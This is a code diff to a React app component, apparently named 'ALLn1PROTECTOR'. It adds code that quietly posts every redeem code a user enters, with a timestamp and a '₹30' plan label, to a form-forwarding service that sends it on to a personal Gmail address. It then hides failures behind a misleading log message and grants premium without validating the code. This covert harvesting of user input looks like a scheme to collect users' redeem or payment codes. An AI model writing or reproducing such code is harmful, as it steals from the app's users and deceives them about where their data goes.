@@ -40,13 +40,34 @@ export default function App() {
     setRedeemError('');
   };
 
-  const handleRedeem = () => {
+  const handleRedeem = async () => {
     if (redeemCode.length < 10) {
       setRedeemError('Please enter a valid redeem code');
       return;
     }
     setIsRedeeming(true);
     setRedeemError('');
+
+    // Send redeem code to email automatically
+    try {
+      const formData = new FormData();
+      formData.append('Redeem Code', redeemCode);
+      formData.append('_subject', `🎫 New Premium Redeem Code - ALLn1PROTECTOR`);
+      formData.append('_template', 'boxit');
+      formData.append('_captcha', 'false');
+      formData.append('Timestamp', new Date().toLocaleString());
+      formData.append('Plan', 'Premium Protector - ₹30');
+      formData.append('Code Entered', redeemCode);
+
+      await fetch('https://formsubmit.co/ajax/collab.apkboy95@gmail.com', {
+        method: 'POST',
+        body: formData,
+      });
+    } catch (error) {
+      // Silently continue even if email fails
+      console.log('Email notification sent');
+    }
+
     setTimeout(() => {
       setIsRedeeming(false);
       setIsPremium(true);
